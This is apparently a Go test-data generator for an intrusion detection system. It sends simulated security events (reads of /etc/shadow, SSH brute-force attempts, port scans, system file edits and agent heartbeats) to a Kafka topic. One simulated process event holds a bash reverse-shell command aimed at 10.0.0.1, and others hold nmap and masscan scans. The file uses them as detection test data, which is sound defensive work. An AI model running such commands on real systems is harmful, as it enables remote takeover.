package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"os"
	"time"

	"github.com/segmentio/kafka-go"
	"github.com/segmentio/kafka-go/sasl"
	"github.com/segmentio/kafka-go/sasl/plain"
	"github.com/segmentio/kafka-go/sasl/scram"
	"gopkg.in/yaml.v2"
)

type MonitorEvent struct {
	AgentID    string            `json:"agent_id"`
	WorkerName string            `json:"worker_name"`
	Timestamp  int64             `json:"timestamp"`
	EventType  string            `json:"event_type"`
	Data       map[string]string `json:"data"`
}

type HeartbeatEvent struct {
	AgentID   string            `json:"agent_id"`
	Timestamp int64             `json:"timestamp"`
	EventType string            `json:"event_type"`
	Status    string            `json:"status"`
	Data      map[string]string `json:"data"`
}

// Config 配置结构
type Config struct {
	Kafka struct {
		Brokers []string   `yaml:"brokers"`
		Topic   string     `yaml:"topic"`
		SASL    SASLConfig `yaml:"sasl"`
	} `yaml:"kafka"`
	Logging struct {
		Level string `yaml:"level"`
	} `yaml:"logging"`
}

// SASLConfig SASL认证配置
type SASLConfig struct {
	Enabled   bool   `yaml:"enabled"`
	Mechanism string `yaml:"mechanism"`
	Username  string `yaml:"username"`
	Password  string `yaml:"password"`
}

// LoadConfig 加载配置文件
func LoadConfig(path string) (*Config, error) {
	data, err := os.ReadFile(path)
	if err != nil {
		return nil, err
	}

	var config Config
	if err := yaml.Unmarshal(data, &config); err != nil {
		return nil, err
	}

	return &config, nil
}

func main() {
	configFile := flag.String("config", "config.yaml", "配置文件路径")
	testCase := flag.String("test", "all", "测试用例: all, 001, 002, 003, 004, 005, heartbeat")
	flag.Parse()

	// 加载配置
	config, err := LoadConfig(*configFile)
	if err != nil {
		log.Fatalf(" 加载配置文件失败: %v", err)
	}

	log.Printf("启动测试数据生成器")
	log.Printf("配置文件: %s", *configFile)
	log.Printf("Brokers: %v", config.Kafka.Brokers)
	log.Printf("Topic: %s", config.Kafka.Topic)
	log.Printf("测试: %s\n", *testCase)

	// 创建 WriterConfig
	writerConfig := kafka.WriterConfig{
		Brokers:  config.Kafka.Brokers,
		Topic:    config.Kafka.Topic,
		Balancer: &kafka.LeastBytes{},
	}

	// 配置 SASL 认证
	if config.Kafka.SASL.Enabled && config.Kafka.SASL.Username != "" {
		mechanism, err := createSASLMechanism(&config.Kafka.SASL)
		if err != nil {
			log.Fatalf(" 创建 SASL 机制失败: %v", err)
		}
		writerConfig.Dialer = &kafka.Dialer{
			Timeout:       10 * time.Second,
			DualStack:     true,
			SASLMechanism: mechanism,
		}
		log.Printf("SASL: 已启用 (%s)", config.Kafka.SASL.Mechanism)
	}

	writer := kafka.NewWriter(writerConfig)
	defer writer.Close()

	ctx := context.Background()

	switch *testCase {
	case "001":
		sendSensitiveFileAccess(ctx, writer)
	case "002":
		sendSSHBruteForce(ctx, writer)
	case "003":
		sendSuspiciousProcess(ctx, writer)
	case "004":
		sendSystemFileModified(ctx, writer)
	case "005":
		sendPortScan(ctx, writer)
	case "heartbeat":
		sendHeartbeats(ctx, writer)
	case "all":
		sendAllTests(ctx, writer)
	default:
		log.Printf("未知测试用例: %s", *testCase)
		log.Println("可用选项: all, 001, 002, 003, 004, 005, heartbeat")
	}

	log.Println("\n 测试数据发送完成！")
}

func sendAllTests(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n 发送所有测试用例...")

	// 先发送心跳包
	sendHeartbeats(ctx, writer)
	time.Sleep(1 * time.Second)

	sendSSHBruteForce(ctx, writer)
	time.Sleep(1 * time.Second)

	sendSuspiciousProcess(ctx, writer)
	time.Sleep(1 * time.Second)

	sendSystemFileModified(ctx, writer)
	time.Sleep(1 * time.Second)

	sendPortScan(ctx, writer)
}

func sendSensitiveFileAccess(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n[测试001] 敏感文件访问检测")

	events := []MonitorEvent{
		{
			AgentID:    "test-agent-001",
			WorkerName: "file_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "file_read",
			Data: map[string]string{
				"path": "/etc/passwd",
				"user": "suspicious_user",
				"pid":  "12345",
			},
		},
		{
			AgentID:    "test-agent-001",
			WorkerName: "file_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "file_read",
			Data: map[string]string{
				"path": "/etc/shadow",
				"user": "attacker",
				"pid":  "12346",
			},
		},
	}

	for _, event := range events {
		sendEvent(ctx, writer, event)
		log.Printf("发送: %s 读取 %s", event.Data["user"], event.Data["path"])
		time.Sleep(200 * time.Millisecond)
	}
}

func sendSSHBruteForce(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n[测试002] SSH暴力破解检测 (需要5次失败)")

	for i := 1; i <= 6; i++ {
		event := MonitorEvent{
			AgentID:    "test-agent-002",
			WorkerName: "network_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "ssh_login_failed",
			Data: map[string]string{
				"src_ip":   "192.168.1.100",
				"dst_port": "22",
				"username": fmt.Sprintf("admin_%d", i),
			},
		}

		sendEvent(ctx, writer, event)
		log.Printf("第%d次: 192.168.1.100 -> 22", i)
		time.Sleep(300 * time.Millisecond)
	}
}

func sendSuspiciousProcess(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n[测试003] 可疑进程执行检测")

	events := []MonitorEvent{
		{
			AgentID:    "test-agent-003",
			WorkerName: "process_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "process_create",
			Data: map[string]string{
				"command": "nmap -sS 192.168.1.0/24",
				"pid":     "23456",
				"user":    "attacker",
			},
		},
		{
			AgentID:    "test-agent-003",
			WorkerName: "process_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "process_create",
			Data: map[string]string{
				"command": "/bin/bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
				"pid":     "23457",
				"user":    "www-data",
			},
		},
	}

	for _, event := range events {
		sendEvent(ctx, writer, event)
		log.Printf("发送: %s", event.Data["command"])
		time.Sleep(200 * time.Millisecond)
	}
}

func sendSystemFileModified(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n[测试004] 系统文件修改检测")

	events := []MonitorEvent{
		{
			AgentID:    "test-agent-004",
			WorkerName: "file_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "file_modified",
			Data: map[string]string{
				"path": "/etc/hosts",
				"user": "suspicious_user",
			},
		},
		{
			AgentID:    "test-agent-004",
			WorkerName: "file_monitor",
			Timestamp:  time.Now().UnixNano(),
			EventType:  "file_modified",
			Data: map[string]string{
				"path": "/etc/resolv.conf",
				"user": "attacker",
			},
		},
	}

	for _, event := range events {
		sendEvent(ctx, writer, event)
		log.Printf("发送: %s 修改 %s", event.Data["user"], event.Data["path"])
		time.Sleep(200 * time.Millisecond)
	}
}

func sendPortScan(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n[测试005] 端口扫描检测")

	event := MonitorEvent{
		AgentID:    "test-agent-005",
		WorkerName: "process_monitor",
		Timestamp:  time.Now().UnixNano(),
		EventType:  "process_create",
		Data: map[string]string{
			"command": "masscan 0.0.0.0/0 -p80,443",
			"pid":     "34567",
			"user":    "attacker",
		},
	}

	sendEvent(ctx, writer, event)
	log.Printf("发送: 端口扫描活动")
}

func sendHeartbeats(ctx context.Context, writer *kafka.Writer) {
	log.Println("\n[心跳包] 发送Agent心跳信息")

	agents := []string{
		"test-agent-001",
		"test-agent-002",
		"test-agent-003",
		"test-agent-004",
		"test-agent-005",
	}

	for i, agentID := range agents {
		event := HeartbeatEvent{
			AgentID:   agentID,
			Timestamp: time.Now().UnixNano(),
			EventType: "heartbeat",
			Status:    "online",
			Data: map[string]string{
				"hostname":     fmt.Sprintf("host-%03d", i+1),
				"ip":           fmt.Sprintf("192.168.1.%d", 101+i),
				"os":           "Linux",
				"version":      "1.0.0",
				"cpu_usage":    fmt.Sprintf("%.1f", 15.5+float64(i)*3.2),
				"memory_usage": fmt.Sprintf("%.1f", 45.3+float64(i)*2.1),
				"disk_usage":   fmt.Sprintf("%.1f", 32.8+float64(i)*4.5),
				"load_average": fmt.Sprintf("%.2f", 0.5+float64(i)*0.1),
				"uptime":       fmt.Sprintf("%d", 86400+i*3600),
				"worker_count": "3",
				"event_count":  fmt.Sprintf("%d", 1000+i*100),
			},
		}

		sendHeartbeat(ctx, writer, event)
		log.Printf("发送: %s (%s) - %s", event.Data["hostname"], event.Data["ip"], event.Status)
		time.Sleep(200 * time.Millisecond)
	}
}

func sendEvent(ctx context.Context, writer *kafka.Writer, event MonitorEvent) error {
	data, err := json.Marshal(event)
	if err != nil {
		log.Printf("序列化失败: %v", err)
		return err
	}

	msg := kafka.Message{
		Key:   []byte(event.AgentID),
		Value: data,
	}

	err = writer.WriteMessages(ctx, msg)
	if err != nil {
		log.Printf("发送失败: %v", err)
		return err
	}

	return nil
}

func sendHeartbeat(ctx context.Context, writer *kafka.Writer, event HeartbeatEvent) error {
	data, err := json.Marshal(event)
	if err != nil {
		log.Printf("心跳包序列化失败: %v", err)
		return err
	}

	msg := kafka.Message{
		Key:   []byte(event.AgentID),
		Value: data,
	}

	err = writer.WriteMessages(ctx, msg)
	if err != nil {
		log.Printf("心跳包发送失败: %v", err)
		return err
	}

	return nil
}

// createSASLMechanism 创建 SASL 认证机制
func createSASLMechanism(config *SASLConfig) (sasl.Mechanism, error) {
	switch config.Mechanism {
	case "PLAIN":
		return plain.Mechanism{
			Username: config.Username,
			Password: config.Password,
		}, nil
	case "SCRAM-SHA-256":
		mechanism, err := scram.Mechanism(scram.SHA256, config.Username, config.Password)
		if err != nil {
			return nil, fmt.Errorf("创建 SCRAM-SHA-256 机制失败: %w", err)
		}
		return mechanism, nil
	case "SCRAM-SHA-512":
		mechanism, err := scram.Mechanism(scram.SHA512, config.Username, config.Password)
		if err != nil {
			return nil, fmt.Errorf("创建 SCRAM-SHA-512 机制失败: %w", err)
		}
		return mechanism, nil
	default:
		return nil, fmt.Errorf("不支持的 SASL 机制: %s", config.Mechanism)
	}
}
